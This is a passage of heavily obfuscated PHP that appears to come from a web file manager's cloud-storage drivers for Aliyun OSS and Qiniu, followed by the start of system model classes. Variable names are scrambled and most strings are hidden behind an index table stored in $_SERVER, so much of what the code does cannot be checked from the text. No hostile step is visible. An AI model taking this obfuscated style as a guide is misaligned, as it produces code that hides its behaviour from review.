3600 * 12, $·‚‰¾¨ã[230], $ƒúæƒæ); return $this->getCdnLink($¢Œ“§ß); } catch (OSS\Core\OssException $¹š¢Åö°) { return !1; } } public function fileOut($ôé¬›şë, $œ”…ğÏ = false, $å™ÊÎì = false, $ß¬óö = '') { $±©ôœÅñ =& $_SERVER[ÏéâËõ‘]; if ($this->isFileOutServer()) { return $this->fileOutServer($ôé¬›şë, $œ”…ğÏ, $å™ÊÎì, $ß¬óö); } if (!$å™ÊÎì) { $å™ÊÎì = $this->pathThis($ôé¬›şë); } $å™ÊÎì = rawurlencode($å™ÊÎì); $®Ó„Ùö‘ = get_file_mime(get_path_ext($å™ÊÎì)); if ($®Ó„Ùö‘ == $±©ôœÅñ[217]) { return parent::fileOut($ôé¬›şë, $œ”…ğÏ, $å™ÊÎì, $ß¬óö); } $œ”…ğÏ = $œ”…ğÏ ? $±©ôœÅñ[1426] : $±©ôœÅñ[1427]; $ÛÌ¡ú = array(OSS\OssClient::OSS_SUB_RESOURCE => $±©ôœÅñ[1428] . rawurlencode("{$œ”…ğÏ}\73\146\x69\x6c\x65\x6e\141\155\145\75{$å™ÊÎì}")); $ÛÌ¡ú[OSS\OssClient::OSS_SUB_RESOURCE] .= $±©ôœÅñ[1429] . rawurlencode($®Ó„Ùö‘); $¡åäë‰ = $this->link($ôé¬›şë, $ÛÌ¡ú); $this->fileOutLink($¡åäë‰); } public function fileOutServer($‡ÀÅÂô¨, $£ŠÑ§˜¬ = false, $¸Ğíáí€ = false, $Ù£¨Üõ = '') { parent::fileOut($‡ÀÅÂô¨, $£ŠÑ§˜¬, $¸Ğíáí€, $Ù£¨Üõ); } public function fileOutImage($  ©ïŒü, $ıËŒŞ½Ó = 250) { $Ñøºçå = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÏéâËõ‘][1430] . $ıËŒŞ½Ó); $Óñå­ëİ = $this->link($  ©ïŒü, $Ñøºçå); $this->fileOutLink($Óñå­ëİ); } public function fileOutImageServer($³ãâ—¹ë, $¬…à¯Æ½ = 250) { parent::fileOutImage($³ãâ—¹ë, $¬…à¯Æ½); } public function fileOutLink($‡‡Ù³Í²) { $šÇåÈ¢± =& $_SERVER[ÏéâËõ‘]; if (!$this->isCdnHost() && substr($‡‡Ù³Í², 0, 7) == $šÇåÈ¢±[1330]) { $‡‡Ù³Í² = $šÇåÈ¢±[1331] . substr($‡‡Ù³Í², 7); } header($šÇåÈ¢±[161] . $‡‡Ù³Í²); die; } public function hashMd5($¥Ä©«²û, $ìÊŞ¸‡ƒ = '') { $¯Ÿ°ìò =& $_SERVER[ÏéâËõ‘]; $ë€“¯¦õ = $this->_objectMeta($¥Ä©«²û); if (!$ë€“¯¦õ) { return $¯Ÿ°ìò[12]; } if (!isset($ë€“¯¦õ[$¯Ÿ°ìò[1405]]) && !empty($ìÊŞ¸‡ƒ)) { $×œ—¤ìÙ = $this->updateObjMeta($¥Ä©«²û, array($¯Ÿ°ìò[1405] => $ìÊŞ¸‡ƒ)); $ë€“¯¦õ[$¯Ÿ°ìò[1405]] = $×œ—¤ìÙ ? $ìÊŞ¸‡ƒ : $¯Ÿ°ìò[12]; } return isset($ë€“¯¦õ[$¯Ÿ°ìò[1405]]) ? strtolower($ë€“¯¦õ[$¯Ÿ°ìò[1405]]) : $¯Ÿ°ìò[12]; } public function size($à¨•»¾¤) { $âš¤‡ØÕ = $this->objectMeta($à¨•»¾¤); return $âš¤‡ØÕ ? $âš¤‡ØÕ[$_SERVER[ÏéâËõ‘][76]] : 0; } public function info($¨àË†»ƒ) { if ($this->isFolder($¨àË†»ƒ)) { return $this->folderInfo($¨àË†»ƒ); } else { if ($this->isFile($¨àË†»ƒ)) { return $this->fileInfo($¨àË†»ƒ); } } return !1; } public function exist($º®ŸÍË¯) { return $this->isFile($º®ŸÍË¯) || $this->isFolder($º®ŸÍË¯); } public function isFile($«ËØËáÔ) { return !$this->isFolder($«ËØËáÔ) && $this->objectMeta($«ËØËáÔ); } public function isFolder($±’çÓÍŠ) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][165], $±’çÓÍŠ); } protected function objectMeta($Èù“—¼›) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][167], $Èù“—¼›); } protected function _objectMeta($‡¶ù¥´) { $ï¦×ƒ¦“ =& $_SERVER[ÏéâËõ‘]; try { $İè¬ãÉ„ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‡¶ù¥´)); } catch (OSS\Core\OssException $» Ø‚‡È) { $İè¬ãÉ„ = !1; } if ($İè¬ãÉ„) { $İè¬ãÉ„[$ï¦×ƒ¦“[76]] = intval($İè¬ãÉ„[$ï¦×ƒ¦“[1403]]); } return $İè¬ãÉ„; } protected function _isFolder($»ƒ¥ûÂ†) { $‡š®ıï¨ =& $_SERVER[ÏéâËõ‘]; if ($»ƒ¥ûÂ† == $‡š®ıï¨[12] || $»ƒ¥ûÂ† == $‡š®ıï¨[8]) { return !0; } $Ğİ¶›à© = array($‡š®ıï¨[1399] => $‡š®ıï¨[8], $‡š®ıï¨[1400] => rtrim($»ƒ¥ûÂ†, $‡š®ıï¨[8]) . $‡š®ıï¨[8], $‡š®ıï¨[1401] => 1, $‡š®ıï¨[1402] => $‡š®ıï¨[12]); $³õÆÓ… = $this->client->listObjects($this->bucket, $Ğİ¶›à©); if ($³õÆÓ…->getObjectList() || $³õÆÓ…->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($§ş·î¸) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÏéâËõ‘][1431]; $this->_init($§ş·î¸); } public function _init($ìÉÂµ±›) { $Š…÷ÎØ¸ =& $_SERVER[ÏéâËõ‘]; foreach ($ìÉÂµ±› as $ôó§ùåå => $ôö¸†ö–) { if (isset($this->{$ôó§ùåå})) { $this->{$ôó§ùåå} = $ôö¸†ö–; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Š…÷ÎØ¸[1432] . LNG($Š…÷ÎØ¸[1390])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($í¦ô“æ, $®‹‰Â»Š = '', $’ğ¦æ¥ = REPEAT_RENAME) { if ($this->setContent($í¦ô“æ, $®‹‰Â»Š)) { return $this->getPathOuter($í¦ô“æ); } return !1; } public function mkdir($¨àüåÓ”, $÷Õ‚Æâ = REPEAT_SKIP) { $Éûé”¤é =& $_SERVER[ÏéâËõ‘]; $‹š…ô«í = trim($¨àüåÓ”, $Éûé”¤é[8]); if ($this->_isFolder($‹š…ô«í)) { return $this->getPathOuter($‹š…ô«í); } $¨àüåÓ” = $‹š…ô«í . $Éûé”¤é[8]; $á›ˆäİô = get_path_this($‹š…ô«í); $Ùûä—æï = $¨àüåÓ” . $á›ˆäİô; if (!$this->mkfile($Ùûä—æï)) { return !1; } if (!$this->moveFile($Ùûä—æï, $¨àüåÓ”)) { $this->delFile($Ùûä—æï); return !1; } return $this->getPathOuter($‹š…ô«í); } public function copyFile($œÅŒò•Ó, $°í—«ÖÆ) { $¯ƒ²ıü = $this->bucketManager->copy($this->bucket, $œÅŒò•Ó, $this->bucket, $°í—«ÖÆ, !0); return $¯ƒ²ıü ? !1 : $this->getPathOuter($°í—«ÖÆ); } public function moveFile($âúü“˜è, $Àª˜ß‹ò) { $úòÄÈ“ = $this->bucketManager->move($this->bucket, $âúü“˜è, $this->bucket, $Àª˜ß‹ò, !0); return $úòÄÈ“ ? !1 : $this->getPathOuter($Àª˜ß‹ò); } public function delFile($Õ¡Ãü¡º) { if (!$this->exist($Õ¡Ãü¡º)) { return !0; } $›‹²óŞ‹ = $this->bucketManager->delete($this->bucket, $Õ¡Ãü¡º); return $›‹²óŞ‹ ? !1 : !0; } public function delFolder($ÀèÚêü) { $ãîØ÷÷ =& $_SERVER[ÏéâËõ‘]; if (!$this->exist($ÀèÚêü)) { return !0; } $this->listItemCache = !1; $®ÓÌÀˆ· = $this->fileList($ÀèÚêü); $this->listItemCache = !0; $£îÑ¹ğ = trim($ÀèÚêü, $ãîØ÷÷[8]) . $ãîØ÷÷[8]; if (!empty($ÀèÚêü) && $ÀèÚêü !== $ãîØ÷÷[197] && !in_array($£îÑ¹ğ, $®ÓÌÀˆ·[$ãîØ÷÷[82]])) { $®ÓÌÀˆ·[$ãîØ÷÷[82]][] = $£îÑ¹ğ; } $¤ë‚†˜š = $this->delByBatch($®ÓÌÀˆ·[$ãîØ÷÷[83]]); if (!$¤ë‚†˜š) { return !1; } $¤ë‚†˜š = $this->delByBatch($®ÓÌÀˆ·[$ãîØ÷÷[82]]); if (!$¤ë‚†˜š) { return !1; } return $this->delFile($£îÑ¹ğ); } private function delByBatch($¨å¥Ì§û) { foreach (array_chunk($¨å¥Ì§û, 1000) as $ŸÎˆ·ìü) { $³ÂŞ¦³ñ = $this->bucketManager->buildBatchDelete($this->bucket, $ŸÎˆ·ìü); list($†úîåãë, $À„™Ô’³) = $this->bucketManager->batch($³ÂŞ¦³ñ); if ($À„™Ô’³) { return !1; } } return !0; } public function rename($ìÃËÁ‘, $€²ã¼÷³) { return $this->renameObject($ìÃËÁ‘, $€²ã¼÷³); } public function fileInfo($¹‘Ç‰£¿, $ğ‡¼ôŒ° = false, $á»‹ìÚ  = array()) { $ÔÏœÉáá =& $_SERVER[ÏéâËõ‘]; $ÀöÛ—§¥ = array($ÔÏœÉáá[32] => $this->pathThis($¹‘Ç‰£¿), $ÔÏœÉáá[84] => $this->getPathOuter($ÔÏœÉáá[8] . $¹‘Ç‰£¿), $ÔÏœÉáá[33] => $ÔÏœÉáá[199], $ÔÏœÉáá[76] => isset($á»‹ìÚ [$ÔÏœÉáá[1433]]) ? $á»‹ìÚ [$ÔÏœÉáá[1433]] : 0, $ÔÏœÉáá[174] => $this->ext($¹‘Ç‰£¿)); if ($ğ‡¼ôŒ°) { return $ÀöÛ—§¥; } $ÀöÛ—§¥[$ÔÏœÉáá[200]] = $ÀöÛ—§¥[$ÔÏœÉáá[85]] = 0; $ÀöÛ—§¥[$ÔÏœÉáá[201]] = $ÀöÛ—§¥[$ÔÏœÉáá[202]] = !0; if (empty($á»‹ìÚ )) { $á»‹ìÚ  = $this->objectMeta($¹‘Ç‰£¿); if (!$á»‹ìÚ ) { return $ÀöÛ—§¥; } } if (isset($á»‹ìÚ [$ÔÏœÉáá[1434]])) { $ÀöÛ—§¥[$ÔÏœÉáá[85]] = substr($á»‹ìÚ [$ÔÏœÉáá[1434]] . $ÔÏœÉáá[12], 0, 10); } if (isset($á»‹ìÚ [$ÔÏœÉáá[1433]])) { $ÀöÛ—§¥[$ÔÏœÉáá[76]] = $á»‹ìÚ [$ÔÏœÉáá[1433]]; } return $ÀöÛ—§¥; } public function folderInfo($üôö…«Š, $Ãõ‹•È€ = false) { $±–ë÷ =& $_SERVER[ÏéâËõ‘]; $«°Ê— = array($±–ë÷[32] => $this->pathThis($üôö…«Š), $±–ë÷[84] => $this->getPathOuter($±–ë÷[8] . $üôö…«Š), $±–ë÷[33] => $±–ë÷[75]); if ($Ãõ‹•È€) { return $«°Ê—; } $«°Ê—[$±–ë÷[200]] = $«°Ê—[$±–ë÷[85]] = 0; $«°Ê—[$±–ë÷[201]] = $«°Ê—[$±–ë÷[202]] = !0; $üôö…«Š = rtrim($üôö…«Š, $±–ë÷[8]) . $±–ë÷[8]; $Õ­èÑƒ = $this->objectMeta($üôö…«Š); if (isset($Õ­èÑƒ[$±–ë÷[1434]])) { $«°Ê—[$±–ë÷[85]] = substr($Õ­èÑƒ[$±–ë÷[1434]] . $±–ë÷[12], 0, 10); } return $«°Ê—; } public function listPath($¶·‹µá, $ô£¯¬îÖ = false) { $®…ç¥Âæ =& $_SERVER[ÏéâËõ‘]; $¬ÀÌêõŸ = $this->fileList($¶·‹µá, $®…ç¥Âæ[8], !0); foreach ($¬ÀÌêõŸ[$®…ç¥Âæ[82]] as $¤ñÅƒ«¢ => $Ôšâ¡î) { $¬ÀÌêõŸ[$®…ç¥Âæ[82]][$¤ñÅƒ«¢] = $this->folderInfo($Ôšâ¡î, $ô£¯¬îÖ); } foreach ($¬ÀÌêõŸ[$®…ç¥Âæ[83]] as $¤ñÅƒ«¢ => $Ôšâ¡î) { $¬ÀÌêõŸ[$®…ç¥Âæ[83]][$¤ñÅƒ«¢] = $this->fileInfo($Ôšâ¡î[$®…ç¥Âæ[94]], $ô£¯¬îÖ, $Ôšâ¡î); } return $¬ÀÌêõŸ; } public function has($’¨ êÉ¹, $»Ú¨ßÃÁ = false, $”¡ò½êº = true) { $ÎÇº”¸¼ =& $_SERVER[ÏéâËõ‘]; $’¨ êÉ¹ = trim($’¨ êÉ¹, $ÎÇº”¸¼[8]); $¬—õ¬Î = empty($’¨ êÉ¹) && $’¨ êÉ¹ !== $ÎÇº”¸¼[197] ? $ÎÇº”¸¼[12] : $’¨ êÉ¹ . $ÎÇº”¸¼[8]; $µ¿Üªà² = $ÎÇº”¸¼[12]; $¿¯ƒÉ±¾ = 500; $Ÿ´°®òœ = $ÎÇº”¸¼[8]; $Š…ÏµÜÚ = $ÔœóšÑ = 0; while (!0) { check_abort(); list($ò‚‚Âğµ, $×‰€—•) = $this->bucketManager->listFiles($this->bucket, $¬—õ¬Î, $µ¿Üªà², $¿¯ƒÉ±¾, $Ÿ´°®òœ); if ($×‰€—•) { break; } $µ¿Üªà² = array_key_exists($ÎÇº”¸¼[1402], $ò‚‚Âğµ) ? $µ¿Üªà² = $ò‚‚Âğµ[$ÎÇº”¸¼[1435]] : $ÎÇº”¸¼[12]; if ($»Ú¨ßÃÁ) { if (!empty($ò‚‚Âğµ[$ÎÇº”¸¼[1436]])) { $Š…ÏµÜÚ += count($ò‚‚Âğµ[$ÎÇº”¸¼[1436]]); } if (!empty($ò‚‚Âğµ[$ÎÇº”¸¼[1437]])) { $ÔœóšÑ += count($ò‚‚Âğµ[$ÎÇº”¸¼[1437]]); } if ($µ¿Üªà² === $ÎÇº”¸¼[12]) { break; } continue; } if ($”¡ò½êº) { if (!empty($ò‚‚Âğµ[$ÎÇº”¸¼[1436]])) { return !0; } } else { if (!empty($ò‚‚Âğµ[$ÎÇº”¸¼[1437]])) { return !0; } } if ($µ¿Üªà² === $ÎÇº”¸¼[12]) { break; } } if ($»Ú¨ßÃÁ) { return array($ÎÇº”¸¼[207] => $Š…ÏµÜÚ, $ÎÇº”¸¼[208] => $ÔœóšÑ); } return !1; } public function listAll($£¥ñ´æÛ) { $ÍçÜÒ¼€ =& $_SERVER[ÏéâËõ‘]; $Ş‹¶û¥À = $this->fileList($£¥ñ´æÛ, $ÍçÜÒ¼€[12], !0); $™¸ÇÜíø = array(); foreach ($Ş‹¶û¥À[$ÍçÜÒ¼€[83]] as $Ÿ¾êá‰é) { $™¸ÇÜíø[$Ÿ¾êá‰é[$ÍçÜÒ¼€[94]]] = $Ÿ¾êá‰é[$ÍçÜÒ¼€[76]]; } foreach ($Ş‹¶û¥À[$ÍçÜÒ¼€[82]] as $Ÿ¾êá‰é) { if (is_string($Ÿ¾êá‰é)) { $™¸ÇÜíø[$Ÿ¾êá‰é] = 0; } } return $this->listAllFiles($£¥ñ´æÛ, array_keys($™¸ÇÜíø), $™¸ÇÜíø); } private function fileList($ÍÌ¤À«Š, $«ÛĞ‰˜ = '', $²ô¾Ûà = 0) { $•òİé²ò =& $_SERVER[ÏéâËõ‘]; $ÍÌ¤À«Š = trim($ÍÌ¤À«Š, $•òİé²ò[8]); $ıÃ÷­¯î = empty($ÍÌ¤À«Š) && $ÍÌ¤À«Š !== $•òİé²ò[197] ? $•òİé²ò[12] : $ÍÌ¤À«Š . $•òİé²ò[8]; $‰ñ“›Òó = $•òİé²ò[12]; $ãŠãƒøİ = 1000; $¬òåù = $úØ½¿¨ğ = array(); while (!0) { check_abort(); list($º‹—Ñ·š, $ßíÕÌı) = $this->bucketManager->listFiles($this->bucket, $ıÃ÷­¯î, $‰ñ“›Òó, $ãŠãƒøİ, $«ÛĞ‰˜); if ($ßíÕÌı) { break; } $‰ñ“›Òó = array_key_exists($•òİé²ò[1402], $º‹—Ñ·š) ? $‰ñ“›Òó = $º‹—Ñ·š[$•òİé²ò[1435]] : $•òİé²ò[12]; $Ë±èªƒ‰ = isset($º‹—Ñ·š[$•òİé²ò[1436]]) ? $º‹—Ñ·š[$•òİé²ò[1436]] : array(); $Œ×Øû›à = isset($º‹—Ñ·š[$•òİé²ò[1437]]) ? $º‹—Ñ·š[$•òİé²ò[1437]] : array(); foreach ($Ë±èªƒ‰ as $¸‹¬Â©²) { if ($¸‹¬Â©²[$•òİé²ò[94]] == $ıÃ÷­¯î) { continue; } $€˜Ú‡– = $¸‹¬Â©²[$•òİé²ò[94]]; $Åœàñö = $¸‹¬Â©²[$•òİé²ò[1433]]; $¸‹¬Â©²[$•òİé²ò[76]] = $Åœàñö; $±ÙñæÊã = $Åœàñö == 0 && substr($€˜Ú‡–, strlen($€˜Ú‡–) - 1, 1) == $•òİé²ò[8] ? !0 : !1; $this->cacheMethodInfoSet($€˜Ú‡–, $±ÙñæÊã, $¸‹¬Â©²); if ($±ÙñæÊã) { $¬òåù[] = $€˜Ú‡–; continue; } $úØ½¿¨ğ[] = $²ô¾Ûà ? $¸‹¬Â©² : $€˜Ú‡–; } foreach ($Œ×Øû›à as $€˜Ú‡–) { if ($€˜Ú‡– == $ıÃ÷­¯î) { continue; } $¬òåù[] = $€˜Ú‡–; $this->cacheMethodInfoSet($€˜Ú‡–, !0); } if ($‰ñ“›Òó === $•òİé²ò[12]) { break; } } $this->cacheMethodInfoSet($ÍÌ¤À«Š, !0); return array($•òİé²ò[82] => $¬òåù, $•òİé²ò[83] => $úØ½¿¨ğ); } public function canRead($†ñÛ£±¤) { return $this->exist($†ñÛ£±¤) ? !0 : !1; } public function canWrite($€¡ùû™œ) { return $this->exist($€¡ùû™œ) ? !0 : !1; } public function getContent($ÂÚíÖïç) { return $this->fileSubstr($ÂÚíÖïç, 0, -1); } public function setContent($‡ò¹¦şô, $´÷ŸÚÌÜ = '') { $µã´©¬Ù = $this->tempFile($this->pathThis($‡ò¹¦şô)); file_put_contents($µã´©¬Ù, $´÷ŸÚÌÜ); if ($this->upload($‡ò¹¦şô, $µã´©¬Ù)) { $this->tempFileRemve($µã´©¬Ù); return !0; } return !1; } public function refreshUrls($êµ­í­) { $½úàéÉ‡ =& $_SERVER[ÏéâËõ‘]; $é£ÎÃ£ = array(); if (is_array($êµ­í­)) { foreach ($êµ­í­ as $éêõåù) { $é£ÎÃ£[] = $this->link($éêõåù); } } else { $é£ÎÃ£[] = $this->link($êµ­í­); } $ßãÈœœ• = new Qiniu\Cdn\CdnManager($this->auth); list($ôÁ–á¾, $Ï’ùä) = $ßãÈœœ•->refreshUrls($é£ÎÃ£); if ($Ï’ùä) { return !1; } return $ôÁ–á¾[$½úàéÉ‡[1188]] == $½úàéÉ‡[762] ? !0 : !1; } public function fileSubstr($Î½¬éÙæ, $ò…Å¦Æ†, $úæ“²ÚÆ) { $²‘ˆÓÈí =& $_SERVER[ÏéâËõ‘]; if (!($²šŸÊ‘¦ = $this->link($Î½¬éÙæ))) { return !1; } $İš¤ª©’ = !1; if ($úæ“²ÚÆ > 0) { $¯ÌçøÃ¯ = $ò…Å¦Æ† + $úæ“²ÚÆ - 1; $İš¤ª©’ = array($²‘ˆÓÈí[1438] . $ò…Å¦Æ† . $²‘ˆÓÈí[386] . $¯ÌçøÃ¯); } $ñÔ¤ÄšÃ = url_request($²šŸÊ‘¦, $²‘ˆÓÈí[230], !1, $İš¤ª©’); return $ñÔ¤ÄšÃ[$²‘ˆÓÈí[752]] ? $ñÔ¤ÄšÃ[$²‘ˆÓÈí[1198]] : !1; } public function upload($è±Ò¶üÎ, $ÉìÅÓáÛ, $ğáÓ = false, $ü¢‰˜²• = REPEAT_REPLACE) { $Ã›ÒÍˆ£ = new Qiniu\Storage\UploadManager(); $«á¢Ç«™ = $this->auth->uploadToken($this->bucket, $è±Ò¶üÎ); $È‰Êì‰¹ = get_file_mime(get_path_ext($ÉìÅÓáÛ)); list($ñ¨öÙ¥÷, $ÛØäÏÑÒ) = $Ã›ÒÍˆ£->putFile($«á¢Ç«™, $è±Ò¶üÎ, $ÉìÅÓáÛ, null, $È‰Êì‰¹); return $ÛØäÏÑÒ ? !1 : $this->getPathOuter($è±Ò¶üÎ); } public function uploadFormData($Ê‘úÇ§…, $ù©ü•óÌ = 3600) { return $this->uploadToken($Ê‘úÇ§…, $ù©ü•óÌ); } public function multiUploadFormData($»åˆñŠ, $€­·á±÷ = 3600) { return $this->uploadToken($»åˆñŠ, $€­·á±÷); } private function uploadToken($Ôë—‘öØ, $å‘”İãã = 3600) { $ş…ùü¹ˆ =& $_SERVER[ÏéâËõ‘]; $‡Íüô¬š = $å‘”İãã; $ææÆ—Ì‡ = array($ş…ùü¹ˆ[1439] => $ş…ùü¹ˆ[1440]); $˜ŒÁ–Í¯ = $Ôë—‘öØ; $…Ã¥Ï = $this->auth->uploadToken($this->bucket, $˜ŒÁ–Í¯, $‡Íüô¬š, $ææÆ—Ì‡, !0); $ËÅŞà´ = empty($this->region) || $this->region == $ş…ùü¹ˆ[1441] ? $ş…ùü¹ˆ[12] : $ş…ùü¹ˆ[386] . $this->region; $íˆòŒï™ = http_type() . "\x3a\57\57\x75\160\154\x6f\x61\144{$ËÅŞà´}\x2e\161\151\x6e\151\x75\160\x2e\143\157\x6d\57"; return array($ş…ùü¹ˆ[1442] => $…Ã¥Ï, $ş…ùü¹ˆ[1443] => $íˆòŒï™); } public function download($‚Â™øº , $£“·Ñ) { $óáµæ£¥ = IO::getPathInner(IO::mkfile($£“·Ñ)); if (!($î¥ª«Âğ = $this->link($‚Â™øº ))) { return !1; } $ÅÈÖêİú = 0; $Ç¨ªƒÖÄ = 1024 * 200; $Ñİô‚“ = fopen($óáµæ£¥, $_SERVER[ÏéâËõ‘][1444]); while (!0) { $“ã’°Ò = $this->fileSubstr($‚Â™øº , $ÅÈÖêİú, $Ç¨ªƒÖÄ); if ($“ã’°Ò === !1) { return !1; } fwrite($Ñİô‚“, $“ã’°Ò); $ÅÈÖêİú += $Ç¨ªƒÖÄ; if (strlen($“ã’°Ò) < $Ç¨ªƒÖÄ) { break; } } fclose($Ñİô‚“); return $£“·Ñ; } public function link($¹æ·³Ÿ¸, $Ñïİî¦ = '') { if (!$this->isFile($¹æ·³Ÿ¸)) { return !1; } $ªóÜ¿Ô = $this->getHost() . $_SERVER[ÏéâËõ‘][8] . $this->pathEncode($¹æ·³Ÿ¸) . $Ñïİî¦; return $this->auth->privateDownloadUrl($ªóÜ¿Ô, 3600 * 12); } public function fileOut($·ùÛ¬¤, $ŠÃ±»…² = false, $ŸºÖÙÙ = false, $êÎÎï¡ƒ = '') { $ÏÕü¹Ô  =& $_SERVER[ÏéâËõ‘]; if ($this->isFileOutServer()) { return $this->fileOutServer($·ùÛ¬¤, $ŠÃ±»…², $ŸºÖÙÙ, $êÎÎï¡ƒ); } if (!$ŸºÖÙÙ) { $ŸºÖÙÙ = $this->pathThis($·ùÛ¬¤); } $°‘¿ô = $ŠÃ±»…² ? $ÏÕü¹Ô [1445] . rawurlencode($ŸºÖÙÙ) : $ÏÕü¹Ô [12]; $¸©æÈ‚¹ = $this->link($·ùÛ¬¤, $°‘¿ô); $this->fileOutLink($¸©æÈ‚¹); } public function fileOutServer($õ ‚’şê, $Ğ¡‡Ğûà = false, $èâ„ñ©‘ = false, $…Ş½¸·æ = '') { parent::fileOut($õ ‚’şê, $Ğ¡‡Ğûà, $èâ„ñ©‘, $…Ş½¸·æ); } public function fileOutImage($ØÅÆÌàĞ, $¬…ä­ÛŒ = 250) { $Î•šïİ = $this->link($ØÅÆÌàĞ, $_SERVER[ÏéâËõ‘][1446] . $¬…ä­ÛŒ); $this->fileOutLink($Î•šïİ); } public function fileOutImageServer($’İÖü¨¸, $üññì—» = 250) { parent::fileOutImage($’İÖü¨¸, $üññì—»); } public function hashMd5($·å©Ñß…) { $ñÎÇÕğ¼ =& $_SERVER[ÏéâËõ‘]; $™ººê·í = $this->objectMeta($·å©Ñß…); return isset($™ººê·í[$ñÎÇÕğ¼[212]]) ? $™ººê·í[$ñÎÇÕğ¼[212]] : !1; $¶ˆš»üí = $this->link($·å©Ñß…, $ñÎÇÕğ¼[1447]); } public function size($§Ñß Œ‹) { $›¬êä’ = $this->objectMeta($§Ñß Œ‹); return $›¬êä’ ? $›¬êä’[$_SERVER[ÏéâËõ‘][76]] : 0; } public function info($áÍ¿ò) { if ($this->isFolder($áÍ¿ò)) { return $this->folderInfo($áÍ¿ò); } else { if ($this->isFile($áÍ¿ò)) { return $this->fileInfo($áÍ¿ò); } } return !1; } public function exist($êğÔ…Ø¼) { return $this->isFile($êğÔ…Ø¼) || $this->isFolder($êğÔ…Ø¼); } public function isFile($É·Ô§”) { return !$this->isFolder($É·Ô§”) && $this->objectMeta($É·Ô§”); } public function isFolder($¢ĞŞìæ) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][165], $¢ĞŞìæ); } protected function objectMeta($Í¬Ñ …é) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][167], $Í¬Ñ …é); } protected function _objectMeta($ß»ğÖÆß) { $ÏÓµ‹±² =& $_SERVER[ÏéâËõ‘]; list($ÂÔ¦½ù¹, $©åÂ†¯Ÿ) = $this->bucketManager->stat($this->bucket, $ß»ğÖÆß); if ($ÂÔ¦½ù¹) { $ÂÔ¦½ù¹[$ÏÓµ‹±²[76]] = intval($ÂÔ¦½ù¹[$ÏÓµ‹±²[1433]]); } return $ÂÔ¦½ù¹; } protected function _isFolder($Ü¥µî‹³) { $ññåşç =& $_SERVER[ÏéâËõ‘]; if ($Ü¥µî‹³ == $ññåşç[12] || $Ü¥µî‹³ == $ññåşç[8]) { return !0; } list($ÀËÚÚŞ“, $¬¸û¶ì) = $this->bucketManager->listFiles($this->bucket, trim($Ü¥µî‹³, $ññåşç[8]) . $ññåşç[8], $ññåşç[12], 1, $ññåşç[8]); return !empty($ÀËÚÚŞ“[$ññåşç[1436]]) || !empty($ÀËÚÚŞ“[$ññåşç[1437]]) ? !0 : !1; } } goto C«×°»ùÈÏ; cî¥Û—£Ş“: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\114\151\147\x68\x74\x41\x70\160"; public $modelType = "\123\x79\163\x74\145\155\117\160\164\x69\157\156"; public $field = array("\156\141\x6d\x65", "\147\x72\157\165\160", "\x64\x65\163\143", "\x63\x6f\x6e\x74\145\156\x74"); public function listData($¸Ş¥¨ä‘ = false, $ùù¯ÖĞŞ = "\x6d\x6f\x64\x69\146\x79\124\x69\x6d\x65", $öÌ¶ÌèÇ = true) { return parent::listData($¸Ş¥¨ä‘, $ùù¯ÖĞŞ, $öÌ¶ÌèÇ); } public function remove($ãŸµß³) { $Á‡¸î‰€ = $this->findByName($ãŸµß³); if (!$Á‡¸î‰€) { return !1; } return parent::remove($Á‡¸î‰€[$_SERVER[ÏéâËõ‘][399]]); } public function add($ü¢÷‰ãç) { if ($this->findByName($ü¢÷‰ãç[$_SERVER[ÏéâËõ‘][32]])) { return !1; } return parent::insert($ü¢÷‰ãç); } public function update($ïÛ§ö”¨, $Î†°êÓÃ) { $½›¡”Ä® =& $_SERVER[ÏéâËõ‘]; $›ú¿ü€ = $this->findByName($ïÛ§ö”¨); $¡Š±Úì© = $this->findByName($Î†°êÓÃ[$½›¡”Ä®[32]]); if (!$›ú¿ü€ || $¡Š±Úì© && $¡Š±Úì©[$½›¡”Ä®[399]] != $›ú¿ü€[$½›¡”Ä®[399]]) { return !1; } return parent::update($›ú¿ü€[$½›¡”Ä®[399]], $Î†°êÓÃ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\x6d\145", "\164\x69\155\145", "\151\x6e\163\x65\162\x74", "\146\165\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $º…ğªøç =& $_SERVER[ÏéâËõ‘]; return array($º…ğªøç[2162] => LNG($º…ğªøç[2163]), $º…ğªøç[2164] => LNG($º…ğªøç[2165]), $º…ğªøç[1777] => LNG($º…ğªøç[2166]), $º…ğªøç[2167] => LNG($º…ğªøç[2168]), $º…ğªøç[2169] => LNG($º…ğªøç[2170]), $º…ğªøç[2171] => LNG($º…ğªøç[2172]), $º…ğªøç[2173] => LNG($º…ğªøç[2174]), $º…ğªøç[1807] => LNG($º…ğªøç[2174]), $º…ğªøç[1808] => LNG($º…ğªøç[2175]), $º…ğªøç[2176] => LNG($º…ğªøç[2177]), $º…ğªøç[2178] => LNG($º…ğªøç[2179]), $º…ğªøç[2180] => LNG($º…ğªøç[2181]), $º…ğªøç[2182] => LNG($º…ğªøç[2183]), $º…ğªøç[1805] => LNG($º…ğªøç[2184]), $º…ğªøç[2185] => LNG($º…ğªøç[2186]), $º…ğªøç[1812] => LNG($º…ğªøç[2187]), $º…ğªøç[2188] => LNG($º…ğªøç[2189]), $º…ğªøç[2190] => LNG($º…ğªøç[2191]), $º…ğªøç[2192] => 